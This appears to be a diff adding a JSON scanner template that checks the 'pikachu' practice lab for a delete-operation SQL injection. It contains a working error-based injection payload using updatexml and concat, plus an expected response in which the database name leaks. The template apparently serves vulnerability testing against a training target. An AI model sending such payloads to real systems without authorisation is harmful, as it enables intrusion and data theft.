@@ -1,0 +1,26 @@
+{
+    "name": "pikachu",
+    "vuln": "deletesql注入",
+    "version": "",
+    "comment": "仅需要多次发包验证的设置mainRequest字段2,否则都以1为准,多次发包依次延续",
+    "type": "1",
+    "mainRequest": {
+        "1": {
+            "request": {
+                "host": "",
+                "method": "POST",
+                "path": "/vul/sqli/sqli_del.php?id=1%20or%20updatexml(1,concat(0x7e,database()),0)",
+                "cookie": "",
+                "requestheader": "",
+                "requestbody": "message=1%2520or%2520updatexml%281%2Cconcat%280x7e%2Cdatabase%28%29%29%2C0%29&submit=submit"
+            },
+            "response": {
+                "statuscode": 200,
+                "statusmessage": "[+] 存在deletesql注入",
+                "responsetime": "",
+                "responseheader": "",
+                "responsebody": "XPATH syntax error: '~pikachu'"
+            }
+        }
+    }
+}
